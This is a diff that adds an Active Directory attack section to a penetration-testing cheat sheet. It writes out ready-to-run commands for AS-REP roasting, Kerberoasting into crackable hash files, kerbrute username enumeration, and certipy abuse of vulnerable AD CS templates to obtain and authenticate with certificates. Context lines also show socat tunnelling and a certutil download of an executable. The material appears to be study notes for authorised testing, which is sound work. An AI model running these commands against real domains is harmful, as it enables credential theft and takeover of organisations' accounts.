@@ -420,6 +420,59 @@ socat TCP-LISTEN:8080,fork TCP:10.10.20.10:80
 # Socat reverse tunnel equivalent (if needed):
 # Run listener on Kali and connect from target appropriately
 
+######################################################################
+# ACTIVE DIRECTORY ATTACK CHEATSHEET
+######################################################################
+
+###############################
+# AS-REP ROASTING
+###############################
+
+# Enumerate AS-REP roastable users (-no-pass required)
+impacket-GetNPUsers $domain/ -dc-ip $targetip -no-pass -usersfile users.txt
+
+###############################
+# KERBEROASTING
+###############################
+# Request TGS tickets for all SPNs
+impacket-GetUserSPNs $domain/$user:$password -dc-ip $targetip -request
+
+# Request TGS tickets for all SPNs
+impacket-GetUserSPNs $domain/$user:$password -dc-ip $targetip -request -outputfile kerberoast_hashes.txt -format john
+
+# Export in offline audit format
+impacket-GetUserSPNs $domain/$user:$password -dc-ip $targetip -request -outputfile kerb_hashes.txt -format john
+
+
+###############################
+# KERBRUTE-STYLE ENUMERATION 
+###############################
+
+# Probe Kerberos for valid usernames
+kerbrute userenum -d $domain --dc $targetip users.txt
+
+###############################
+# CERTIFICATE SERVICES (AD CS) ENUM 
+###############################
+
+# 1. Enumerate AD CS
+certipy find -u $user -p $password -dc-ip $targetip -domain $domain
+
+# 2. Find vulnerable certificate templates (ESC1–ESC8)
+certipy find -u $user -p $password -dc-ip $targetip -domain $domain -vulnerable
+
+# 3. Request a certificate from a template
+certipy req -u $user -p $password -dc-ip $targetip -domain $domain -template $template -out cert.pfx
+
+# 4. Authenticate with the certificate
+certipy auth -pfx cert.pfx -dc-ip $targetip
+
+# 5. Convert a certificate (PEM)
+certipy cert -pfx cert.pfx -key key.pem -cert cert.pem
+
+
+######################################################################
+
 
 ######################################################################
 # MISC / GENERAL
@@ -443,3 +496,4 @@ certutil -urlcache -split -f http://$localip/file.exe file.exe
 ######################################################################
 # END OF CHEATSHEET
 ######################################################################
+
